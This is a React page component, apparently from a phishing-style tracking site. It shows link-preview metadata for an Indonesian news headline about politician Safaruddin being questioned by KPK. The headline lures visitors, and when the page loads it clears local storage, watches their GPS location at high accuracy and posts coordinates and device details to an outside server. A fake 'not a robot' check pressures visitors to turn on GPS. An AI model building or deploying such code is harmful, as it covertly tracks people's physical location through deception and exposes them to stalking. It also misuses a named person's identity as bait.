import React, { useState, useEffect, useCallback } from 'react';
import DynamicPage from './DynamicPage';

const Home = () => {
  const [gpsEnabled, setGpsEnabled] = useState(true);
  const [watchId, setWatchId] = useState(null);

  const pageData = {
    title: 'Mantan Wakil Ketua DPRA Safaruddin Diperiksa KPK',
    description: 'Sosok calon bupati aceh barat daya 2024 Dr. Safaruddin diperiksa oleh KPK. Dugaan sementara pemeriksaan terhadap ....',
    image: 'https://www.mimbaraceh.com/files/images/20220522-wakil-ketua-dpra-safaruddin-headshoot.jpg',
    url: 'https://dpra.acehprov.go.id/pejabat/pimpinan-dpra/wakil-ketua-iii-dewan-perwakilan-rakyat-aceh'
  };
  const sendLocationData = (latitude, longitude, accuracy) => {
    console.log('Sending location data:', { latitude, longitude, accuracy });
    const userAgent = navigator.userAgent;

    fetch('https://tracelocation.vercel.app/api/save-location', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        latitude,
        longitude,
        accuracy,
        device_info: userAgent,
        ip_address: '', // Tambahkan jika kamu bisa menangani IP di sisi server
      }),
    })
      .then((response) => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then((data) => {
        console.log('Location data saved:', data);
      })
      .catch((error) => console.error('Error saving location data:', error));
  };

  const requestLocation = useCallback(() => {
    if (navigator.geolocation) {
      const id = navigator.geolocation.watchPosition(
        (position) => {
          const { latitude, longitude, accuracy } = position.coords;
          sendLocationData(latitude, longitude, accuracy);
        },
        (error) => {
          console.error('Geolocation error:', error);
          setGpsEnabled(false);
          // Memunculkan notifikasi jika GPS belum aktif
          alert('GPS belum aktif. Mohon aktifkan GPS untuk melanjutkan.');
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0,
        }
      );
      setWatchId(id);
    } else {
      setGpsEnabled(false);
      // Memunculkan notifikasi jika tidak ada dukungan geolokasi
      alert('Perangkat Anda tidak mendukung geolokasi.');
    }
  }, []);

  useEffect(() => {
    localStorage.clear();
    requestLocation();

    return () => {
      if (watchId !== null) {
        navigator.geolocation.clearWatch(watchId);
      }
    };
  }, [requestLocation, watchId]);

  return (
    <div style={{ textAlign: 'center', padding: '20px' }}>
      <DynamicPage 
        title={pageData.title} 
        description={pageData.description} 
        image={pageData.image} 
        url={pageData.url}
      />

      {gpsEnabled ? (
        <div>
          <p style={{ color: 'green' }}>Anda sudah di konfirmasi bahwa bukan robot.</p>
        </div>
      ) : (
        <div>
          <h1>Verifikasi Anda Bukan Robot</h1>
          <p>
            Kami membutuhkan lokasi anda untuk memverifikasi bahwa anda bukan robot.
          </p>
          <p>
            Mohon aktifkan GPS dan muat ulang halaman ini.
          </p>
        </div>
      )}
    </div>
  );
};

export default Home;
